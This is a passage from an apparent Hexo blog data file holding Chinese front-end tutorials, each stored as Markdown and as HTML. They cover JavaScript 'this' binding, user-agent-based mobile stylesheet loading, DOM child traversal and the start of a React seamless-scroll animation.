函数有<code>以下几种</code>调用方式：<code>作为对象方法调用</code>、<code>作为函数调用</code>、<code>作为构造函数调用</code>、<code>apply</code>或<code>call</code>调用。</p>\n<ul>\n<li><p><strong>对象方法调用</strong><br>作为<code>对象方法</code>调用的时候,<code>this</code>会被<code>绑定到该对象</code>。<br>例：略</p>\n</li>\n<li><p><strong>强调</strong>:<br><code>this</code>是在函数<code>执行时</code>去获取对应的值,而不是函数<code>定义时</code>。即使是<code>对象方法</code>调用,如果该方法的<code>函数属性</code>以<code>函数名的形式</code>传入<code>其他作用域</code>,也会<code>改变this</code>的指向。我举一个例子：</p>\n</li>\n<li><p><strong>函数调用</strong><br>函数也可以<code>直接被调用</code>,这个时候<code>this</code>被<code>绑定到了全局对象</code>。</p>\n</li>\n<li><p><strong>构造函数调用</strong><br>在javascript中自己创建<code>构造函数</code>时可以<code>利用this</code>来指向新创建的对象上。这样就可以避免函数中的this指向全局了。</p>\n</li>\n<li><p><strong>apply或call调用</strong><br>这两个方法可以<code>切换</code>函数执行的<code>上下文环境</code>,也就是<code>改变this绑定的对象</code>。apply和call比较类似,区别在于传入参数时一个要求是数组,一个要求是分开传入。所以我们以apply为例：</p>\n</li>\n<li><p><strong>箭头函数调用</strong><br><code>补充</code>:ES6中 <code>箭头函数</code>的<code>this始终指向函数定义时的this, 而非执行时</code>。<br>我们通过一个例子来理解:<br>还需要<strong>注意</strong>一点的就是这个<code>this不会改变指向对象</code>,我们知道<code>call</code>和<code>apply</code>可以改变<code>this</code>的指向,但是在<code>箭头函数中无效</code>的。</p>\n</li>\n<li><p><strong>箭头函数的特性</strong><br>箭头函数内部没有<code>constructor</code>方法,也没有<code>prototype</code>,所以不支持<code>new</code>操作。但是它对<code>this</code>的处理与一般的普通函数不一样。箭头函数的<code>this</code>始终指向函数<code>定义时</code>的 <code>this</code>,而非执行时。我们通过一个例子来理解:</p>\n</li>\n</ul>\n<hr>\n<p><a href=\"http://blog.csdn.net/mevicky/article/details/46659273\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"转-深入理解javascript之this\"><a href=\"#转-深入理解javascript之this\" class=\"headerlink\" title=\"[转]深入理解javascript之this\"></a>[转]深入理解javascript之this</h1><p>  (2018年2月28日 16:38:18)</p>\n<p>  javascript中的<code>this</code>含义非常丰富,它可以是<code>全局对象</code>,<code>当前对象</code>或者是<code>任意对象</code>,这都<code>取决于</code><strong>函数的调用方式</strong>。<br>  函数有<code>以下几种</code>调用方式：<code>作为对象方法调用</code>、<code>作为函数调用</code>、<code>作为构造函数调用</code>、<code>apply</code>或<code>call</code>调用。</p>\n<ul>\n<li><p><strong>对象方法调用</strong><br>作为<code>对象方法</code>调用的时候,<code>this</code>会被<code>绑定到该对象</code>。<br>例：略</p>\n</li>\n<li><p><strong>强调</strong>:<br><code>this</code>是在函数<code>执行时</code>去获取对应的值,而不是函数<code>定义时</code>。即使是<code>对象方法</code>调用,如果该方法的<code>函数属性</code>以<code>函数名的形式</code>传入<code>其他作用域</code>,也会<code>改变this</code>的指向。我举一个例子：</p>\n</li>\n<li><p><strong>函数调用</strong><br>函数也可以<code>直接被调用</code>,这个时候<code>this</code>被<code>绑定到了全局对象</code>。</p>\n</li>\n<li><p><strong>构造函数调用</strong><br>在javascript中自己创建<code>构造函数</code>时可以<code>利用this</code>来指向新创建的对象上。这样就可以避免函数中的this指向全局了。</p>\n</li>\n<li><p><strong>apply或call调用</strong><br>这两个方法可以<code>切换</code>函数执行的<code>上下文环境</code>,也就是<code>改变this绑定的对象</code>。apply和call比较类似,区别在于传入参数时一个要求是数组,一个要求是分开传入。所以我们以apply为例：</p>\n</li>\n<li><p><strong>箭头函数调用</strong><br><code>补充</code>:ES6中 <code>箭头函数</code>的<code>this始终指向函数定义时的this, 而非执行时</code>。<br>我们通过一个例子来理解:<br>还需要<strong>注意</strong>一点的就是这个<code>this不会改变指向对象</code>,我们知道<code>call</code>和<code>apply</code>可以改变<code>this</code>的指向,但是在<code>箭头函数中无效</code>的。</p>\n</li>\n<li><p><strong>箭头函数的特性</strong><br>箭头函数内部没有<code>constructor</code>方法,也没有<code>prototype</code>,所以不支持<code>new</code>操作。但是它对<code>this</code>的处理与一般的普通函数不一样。箭头函数的<code>this</code>始终指向函数<code>定义时</code>的 <code>this</code>,而非执行时。我们通过一个例子来理解:</p>\n</li>\n</ul>\n<hr>\n<p><a href=\"http://blog.csdn.net/mevicky/article/details/46659273\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"移动检测","date":"2018-05-12T01:53:48.000Z","_content":"## [转]检测 移动端/PC端 加载不同样式表现\n\n第一种方式：\n````\nif (/AppleWebKit.*mobile/i.test(navigator.userAgent) || (/MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/.test(navigator.userAgent))) {\n  if (window.location.href.indexOf(\"?mobile\") < 0) {\n    try {\n      if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {\n        //window.location.href = \"手机页面\";\n        console.log('手机页面')\n      } else if (/iPad/i.test(navigator.userAgent)) {\n        //window.location.href = \"平板页面\";\n        console.log('平板页面')\n      } else {\n        //window.location.href = \"其他移动端页面\"\n        console.log('其他移动端页面')\n      }\n    } catch (e) {\n      console.log('e:', e);\n    }\n  }\n} else {\n  console.log('PC页面');\n}\n````\n\n第二种方式：\n````\n<script type=\"text/javascript\">\n  // 判断是否为移动端运行环境 \n  if (/AppleWebKit.*Mobile/i.test(navigator.userAgent) || (\n      /MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/\n      .test(navigator.userAgent))) {\n    if (window.location.href.indexOf(\"?mobile\") < 0) {\n      try {\n        if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {\n          // 判断访问环境是 Android|webOS|iPhone|iPod|BlackBerry 则加载以下样式 \n          setActiveStyleSheet(\"style_mobile_a.css\");\n        } else if (/iPad/i.test(navigator.userAgent)) {\n          // 判断访问环境是 iPad 则加载以下样式 \n          setActiveStyleSheet(\"style_mobile_iPad.css\");\n        } else {\n          // 判断访问环境是 其他移动设备 则加载以下样式 \n          setActiveStyleSheet(\"style_mobile_other.css\");\n        }\n      } catch (e) {}\n    }\n  } else {\n    // 如果以上都不是，则加载以下样式 \n    setActiveStyleSheet(\"style_mobile_no.css\");\n  }\n\n  // 判断完毕后加载样式 \n  function setActiveStyleSheet(filename) {\n    document.write(\"<link href=\" + filename + \" rel=stylesheet>\");\n  }\n</script>\n````\n\n----------\n#### [阅读原文](https://www.cnblogs.com/yuqingfamily/p/8807978.html)","source":"_posts/FrontEnd/JS/移动检测.md","raw":"---\ntitle: 移动检测\ndate: 2018-05-12 09:53:48\ntags: If Mobile\ncategories: JS\n---\n## [转]检测 移动端/PC端 加载不同样式表现\n\n第一种方式：\n````\nif (/AppleWebKit.*mobile/i.test(navigator.userAgent) || (/MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/.test(navigator.userAgent))) {\n  if (window.location.href.indexOf(\"?mobile\") < 0) {\n    try {\n      if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {\n        //window.location.href = \"手机页面\";\n        console.log('手机页面')\n      } else if (/iPad/i.test(navigator.userAgent)) {\n        //window.location.href = \"平板页面\";\n        console.log('平板页面')\n      } else {\n        //window.location.href = \"其他移动端页面\"\n        console.log('其他移动端页面')\n      }\n    } catch (e) {\n      console.log('e:', e);\n    }\n  }\n} else {\n  console.log('PC页面');\n}\n````\n\n第二种方式：\n````\n<script type=\"text/javascript\">\n  // 判断是否为移动端运行环境 \n  if (/AppleWebKit.*Mobile/i.test(navigator.userAgent) || (\n      /MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/\n      .test(navigator.userAgent))) {\n    if (window.location.href.indexOf(\"?mobile\") < 0) {\n      try {\n        if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {\n          // 判断访问环境是 Android|webOS|iPhone|iPod|BlackBerry 则加载以下样式 \n          setActiveStyleSheet(\"style_mobile_a.css\");\n        } else if (/iPad/i.test(navigator.userAgent)) {\n          // 判断访问环境是 iPad 则加载以下样式 \n          setActiveStyleSheet(\"style_mobile_iPad.css\");\n        } else {\n          // 判断访问环境是 其他移动设备 则加载以下样式 \n          setActiveStyleSheet(\"style_mobile_other.css\");\n        }\n      } catch (e) {}\n    }\n  } else {\n    // 如果以上都不是，则加载以下样式 \n    setActiveStyleSheet(\"style_mobile_no.css\");\n  }\n\n  // 判断完毕后加载样式 \n  function setActiveStyleSheet(filename) {\n    document.write(\"<link href=\" + filename + \" rel=stylesheet>\");\n  }\n</script>\n````\n\n----------\n#### [阅读原文](https://www.cnblogs.com/yuqingfamily/p/8807978.html)","slug":"FrontEnd/JS/移动检测","published":1,"updated":"2018-09-05T06:33:18.460Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry0600ajzodv52sy3hjm","content":"<h2 id=\"转-检测-移动端-PC端-加载不同样式表现\"><a href=\"#转-检测-移动端-PC端-加载不同样式表现\" class=\"headerlink\" title=\"[转]检测 移动端/PC端 加载不同样式表现\"></a>[转]检测 移动端/PC端 加载不同样式表现</h2><p>第一种方式：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (/AppleWebKit.*mobile/i.test(navigator.userAgent) || (/MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/.test(navigator.userAgent))) &#123;</span><br><span class=\"line\">  if (window.location.href.indexOf(&quot;?mobile&quot;) &lt; 0) &#123;</span><br><span class=\"line\">    try &#123;</span><br><span class=\"line\">      if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) &#123;</span><br><span class=\"line\">        //window.location.href = &quot;手机页面&quot;;</span><br><span class=\"line\">        console.log(&apos;手机页面&apos;)</span><br><span class=\"line\">      &#125; else if (/iPad/i.test(navigator.userAgent)) &#123;</span><br><span class=\"line\">        //window.location.href = &quot;平板页面&quot;;</span><br><span class=\"line\">        console.log(&apos;平板页面&apos;)</span><br><span class=\"line\">      &#125; else &#123;</span><br><span class=\"line\">        //window.location.href = &quot;其他移动端页面&quot;</span><br><span class=\"line\">        console.log(&apos;其他移动端页面&apos;)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125; catch (e) &#123;</span><br><span class=\"line\">      console.log(&apos;e:&apos;, e);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">  console.log(&apos;PC页面&apos;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>第二种方式：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class=\"line\">  // 判断是否为移动端运行环境 </span><br><span class=\"line\">  if (/AppleWebKit.*Mobile/i.test(navigator.userAgent) || (</span><br><span class=\"line\">      /MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/</span><br><span class=\"line\">      .test(navigator.userAgent))) &#123;</span><br><span class=\"line\">    if (window.location.href.indexOf(&quot;?mobile&quot;) &lt; 0) &#123;</span><br><span class=\"line\">      try &#123;</span><br><span class=\"line\">        if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) &#123;</span><br><span class=\"line\">          // 判断访问环境是 Android|webOS|iPhone|iPod|BlackBerry 则加载以下样式 </span><br><span class=\"line\">          setActiveStyleSheet(&quot;style_mobile_a.css&quot;);</span><br><span class=\"line\">        &#125; else if (/iPad/i.test(navigator.userAgent)) &#123;</span><br><span class=\"line\">          // 判断访问环境是 iPad 则加载以下样式 </span><br><span class=\"line\">          setActiveStyleSheet(&quot;style_mobile_iPad.css&quot;);</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">          // 判断访问环境是 其他移动设备 则加载以下样式 </span><br><span class=\"line\">          setActiveStyleSheet(&quot;style_mobile_other.css&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125; catch (e) &#123;&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125; else &#123;</span><br><span class=\"line\">    // 如果以上都不是，则加载以下样式 </span><br><span class=\"line\">    setActiveStyleSheet(&quot;style_mobile_no.css&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  // 判断完毕后加载样式 </span><br><span class=\"line\">  function setActiveStyleSheet(filename) &#123;</span><br><span class=\"line\">    document.write(&quot;&lt;link href=&quot; + filename + &quot; rel=stylesheet&gt;&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h4 id=\"阅读原文\"><a href=\"#阅读原文\" class=\"headerlink\" title=\"阅读原文\"></a><a href=\"https://www.cnblogs.com/yuqingfamily/p/8807978.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a></h4>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"转-检测-移动端-PC端-加载不同样式表现\"><a href=\"#转-检测-移动端-PC端-加载不同样式表现\" class=\"headerlink\" title=\"[转]检测 移动端/PC端 加载不同样式表现\"></a>[转]检测 移动端/PC端 加载不同样式表现</h2><p>第一种方式：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (/AppleWebKit.*mobile/i.test(navigator.userAgent) || (/MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/.test(navigator.userAgent))) &#123;</span><br><span class=\"line\">  if (window.location.href.indexOf(&quot;?mobile&quot;) &lt; 0) &#123;</span><br><span class=\"line\">    try &#123;</span><br><span class=\"line\">      if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) &#123;</span><br><span class=\"line\">        //window.location.href = &quot;手机页面&quot;;</span><br><span class=\"line\">        console.log(&apos;手机页面&apos;)</span><br><span class=\"line\">      &#125; else if (/iPad/i.test(navigator.userAgent)) &#123;</span><br><span class=\"line\">        //window.location.href = &quot;平板页面&quot;;</span><br><span class=\"line\">        console.log(&apos;平板页面&apos;)</span><br><span class=\"line\">      &#125; else &#123;</span><br><span class=\"line\">        //window.location.href = &quot;其他移动端页面&quot;</span><br><span class=\"line\">        console.log(&apos;其他移动端页面&apos;)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125; catch (e) &#123;</span><br><span class=\"line\">      console.log(&apos;e:&apos;, e);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">  console.log(&apos;PC页面&apos;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>第二种方式：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class=\"line\">  // 判断是否为移动端运行环境 </span><br><span class=\"line\">  if (/AppleWebKit.*Mobile/i.test(navigator.userAgent) || (</span><br><span class=\"line\">      /MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/</span><br><span class=\"line\">      .test(navigator.userAgent))) &#123;</span><br><span class=\"line\">    if (window.location.href.indexOf(&quot;?mobile&quot;) &lt; 0) &#123;</span><br><span class=\"line\">      try &#123;</span><br><span class=\"line\">        if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) &#123;</span><br><span class=\"line\">          // 判断访问环境是 Android|webOS|iPhone|iPod|BlackBerry 则加载以下样式 </span><br><span class=\"line\">          setActiveStyleSheet(&quot;style_mobile_a.css&quot;);</span><br><span class=\"line\">        &#125; else if (/iPad/i.test(navigator.userAgent)) &#123;</span><br><span class=\"line\">          // 判断访问环境是 iPad 则加载以下样式 </span><br><span class=\"line\">          setActiveStyleSheet(&quot;style_mobile_iPad.css&quot;);</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">          // 判断访问环境是 其他移动设备 则加载以下样式 </span><br><span class=\"line\">          setActiveStyleSheet(&quot;style_mobile_other.css&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125; catch (e) &#123;&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125; else &#123;</span><br><span class=\"line\">    // 如果以上都不是，则加载以下样式 </span><br><span class=\"line\">    setActiveStyleSheet(&quot;style_mobile_no.css&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  // 判断完毕后加载样式 </span><br><span class=\"line\">  function setActiveStyleSheet(filename) &#123;</span><br><span class=\"line\">    document.write(&quot;&lt;link href=&quot; + filename + &quot; rel=stylesheet&gt;&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h4 id=\"阅读原文\"><a href=\"#阅读原文\" class=\"headerlink\" title=\"阅读原文\"></a><a href=\"https://www.cnblogs.com/yuqingfamily/p/8807978.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a></h4>"},{"title":"遍历DOM","date":"2018-05-23T07:10:48.000Z","_content":"## 遍历dom节点\n\n### `childNodes` 和 `children` 区别\n\n````\n  <!-- 这部分为获取元素系列操作重点在 `childNodes` `children` -->\n  // let ddHight = document.getElementsByClassName('showdd')[0];\n  // let dCh1 = ddHight.childNodes;\n  // let dCh2 = ddHight.children;\n````\n------\n\n[阅读原文](https://www.baidu.com/s?wd=遍历dom节点&rsv_spt=1&rsv_iqid=0xaf4a3db3000138a2&issp=1&f=3&rsv_bp=1&rsv_idx=2&ie=utf-8&rqlang=cn&tn=98012088_4_dg&ch=1&rsv_enter=1&oq=%25E5%25A6%2582%25E4%25BD%2595%25E9%2581%258D%25E5%258E%2586element%25E8%258A%2582%25E7%2582%25B9&rsv_t=6622C4udbYHMy%2Fz88Zn2YEqLcdlbOvZsVIngnU74KJya5W8v7BGUVZMdfejA1X93%2Fo2xXg&inputT=4844&rsv_pq=a5934c810006a2c1&rsv_sug3=50&rsv_sug1=40&rsv_sug7=100&rsv_sug2=0&prefixsug=%25E9%2581%258D%25E5%258E%2586dom&rsp=1&rsv_sug4=4844)","source":"_posts/FrontEnd/JS/遍历DOM.md","raw":"---\ntitle: 遍历DOM\ndate: 2018-05-23 15:10:48\ntags: 遍历DOM\ncategories: JS-DOM\n---\n## 遍历dom节点\n\n### `childNodes` 和 `children` 区别\n\n````\n  <!-- 这部分为获取元素系列操作重点在 `childNodes` `children` -->\n  // let ddHight = document.getElementsByClassName('showdd')[0];\n  // let dCh1 = ddHight.childNodes;\n  // let dCh2 = ddHight.children;\n````\n------\n\n[阅读原文](https://www.baidu.com/s?wd=遍历dom节点&rsv_spt=1&rsv_iqid=0xaf4a3db3000138a2&issp=1&f=3&rsv_bp=1&rsv_idx=2&ie=utf-8&rqlang=cn&tn=98012088_4_dg&ch=1&rsv_enter=1&oq=%25E5%25A6%2582%25E4%25BD%2595%25E9%2581%258D%25E5%258E%2586element%25E8%258A%2582%25E7%2582%25B9&rsv_t=6622C4udbYHMy%2Fz88Zn2YEqLcdlbOvZsVIngnU74KJya5W8v7BGUVZMdfejA1X93%2Fo2xXg&inputT=4844&rsv_pq=a5934c810006a2c1&rsv_sug3=50&rsv_sug1=40&rsv_sug7=100&rsv_sug2=0&prefixsug=%25E9%2581%258D%25E5%258E%2586dom&rsp=1&rsv_sug4=4844)","slug":"FrontEnd/JS/遍历DOM","published":1,"updated":"2018-09-05T06:33:18.460Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry0700amzodv9fj6vsl1","content":"<h2 id=\"遍历dom节点\"><a href=\"#遍历dom节点\" class=\"headerlink\" title=\"遍历dom节点\"></a>遍历dom节点</h2><h3 id=\"childNodes-和-children-区别\"><a href=\"#childNodes-和-children-区别\" class=\"headerlink\" title=\"childNodes 和 children 区别\"></a><code>childNodes</code> 和 <code>children</code> 区别</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- 这部分为获取元素系列操作重点在 `childNodes` `children` --&gt;</span><br><span class=\"line\">// let ddHight = document.getElementsByClassName(&apos;showdd&apos;)[0];</span><br><span class=\"line\">// let dCh1 = ddHight.childNodes;</span><br><span class=\"line\">// let dCh2 = ddHight.children;</span><br></pre></td></tr></table></figure>\n<hr>\n<p><a href=\"https://www.baidu.com/s?wd=遍历dom节点&amp;rsv_spt=1&amp;rsv_iqid=0xaf4a3db3000138a2&amp;issp=1&amp;f=3&amp;rsv_bp=1&amp;rsv_idx=2&amp;ie=utf-8&amp;rqlang=cn&amp;tn=98012088_4_dg&amp;ch=1&amp;rsv_enter=1&amp;oq=%25E5%25A6%2582%25E4%25BD%2595%25E9%2581%258D%25E5%258E%2586element%25E8%258A%2582%25E7%2582%25B9&amp;rsv_t=6622C4udbYHMy%2Fz88Zn2YEqLcdlbOvZsVIngnU74KJya5W8v7BGUVZMdfejA1X93%2Fo2xXg&amp;inputT=4844&amp;rsv_pq=a5934c810006a2c1&amp;rsv_sug3=50&amp;rsv_sug1=40&amp;rsv_sug7=100&amp;rsv_sug2=0&amp;prefixsug=%25E9%2581%258D%25E5%258E%2586dom&amp;rsp=1&amp;rsv_sug4=4844\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"遍历dom节点\"><a href=\"#遍历dom节点\" class=\"headerlink\" title=\"遍历dom节点\"></a>遍历dom节点</h2><h3 id=\"childNodes-和-children-区别\"><a href=\"#childNodes-和-children-区别\" class=\"headerlink\" title=\"childNodes 和 children 区别\"></a><code>childNodes</code> 和 <code>children</code> 区别</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- 这部分为获取元素系列操作重点在 `childNodes` `children` --&gt;</span><br><span class=\"line\">// let ddHight = document.getElementsByClassName(&apos;showdd&apos;)[0];</span><br><span class=\"line\">// let dCh1 = ddHight.childNodes;</span><br><span class=\"line\">// let dCh2 = ddHight.children;</span><br></pre></td></tr></table></figure>\n<hr>\n<p><a href=\"https://www.baidu.com/s?wd=遍历dom节点&amp;rsv_spt=1&amp;rsv_iqid=0xaf4a3db3000138a2&amp;issp=1&amp;f=3&amp;rsv_bp=1&amp;rsv_idx=2&amp;ie=utf-8&amp;rqlang=cn&amp;tn=98012088_4_dg&amp;ch=1&amp;rsv_enter=1&amp;oq=%25E5%25A6%2582%25E4%25BD%2595%25E9%2581%258D%25E5%258E%2586element%25E8%258A%2582%25E7%2582%25B9&amp;rsv_t=6622C4udbYHMy%2Fz88Zn2YEqLcdlbOvZsVIngnU74KJya5W8v7BGUVZMdfejA1X93%2Fo2xXg&amp;inputT=4844&amp;rsv_pq=a5934c810006a2c1&amp;rsv_sug3=50&amp;rsv_sug1=40&amp;rsv_sug7=100&amp;rsv_sug2=0&amp;prefixsug=%25E9%2581%258D%25E5%258E%2586dom&amp;rsp=1&amp;rsv_sug4=4844\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"react-无缝滚动动画","date":"2018-12-18T01:22:18.000Z","_content":"## 无缝滚动\n\n### 第一步 定义 Dom结构\n\n+ 第一层`div`最外侧 负责 1️⃣鼠标 交互，2️⃣超出隐藏\n+ 第二层`div`负责整体动画，通过`marginTop`属性实现动画效果\n```html\n<div\n  className=\"contetn\"\n  ref=\"content\" // react中 通过 this.refs.content 获取 Dom元素\n  onMouseEnter={this.removeAnimationInterval} // 鼠标移入 清除定时器\n  onMouseLeave={this.animationInterval} // 鼠标移出 设置定时器\n  style={{overflow: \"hidden\"}} // 超出隐藏 多余内容\n  // onWheel={} // 鼠标滚轴 事件\n>\n  <div style={{ marginTop: scrollData + \"px\" }}> // 通过`marginTop`属性实现动画效果\n    {\n      dutyList.map((item, index) => {\n        return (\n          <div className=\"card\" key={`${item.title}:${item.name}${index}`}>\n            内部元素 非 动画效果 关键，可自定义内容\n          </div>\n        )\n      })\n    }\n  </div>\n</div>\n```\n\n### 第二步 获取数据 利用周期执行动画\n在请求数据的回调函数 中 设置state, 利用回调 执行 动画方法\n```ts\n  getOnDutyListData() {\n    axios({\n      method: 'GET',\n      url: `/OnDutyList`,\n    }).then(res => {\n      this.setState({\n        dutyList: res.data.result\n      }, () => this.animationInterval()) // 在这里，利用 回调 执行 动画方法。可以避免 在其他 周期里面获取不到 异步数据的情况\n    })\n  }\n```\n\n### 第三步 动画实现效果\n```ts\nanimationInterval() {\n  /** 获取滚动系数, 数据矩阵 */\n  let { scrollData, dutyList } = this.state;\n  /** 非空判断 */\n  if (!dutyList.length) return;\n\n  /** 设置定时器，挂载到 当前类下的 state */\n  this.state.animationInterval = setInterval(() => {\n    /** setState触发render，实现实时动画效果 */\n    this.setState({\n      scrollData: scrollData--\n    });\n\n    /** 初始化判断 */\n    if (this.state.inital && scrollData === -1) {\n      dutyList.push(dutyList[0]); // 第一次多加载 一个 数据第一项，实现首尾无缝滚动 \n      this.setState({\n        inital: false // 关闭 初始化\n      })\n    }\n\n    /** 判断 滚动位置 128为当前效果 中 itemCard 高度, 一但card全部高度 超出视图 执行内部语句 */\n    if (scrollData % 128 === 0) {\n      dutyList.shift(); // 删除第一项\n      dutyList.push(dutyList[0]); // 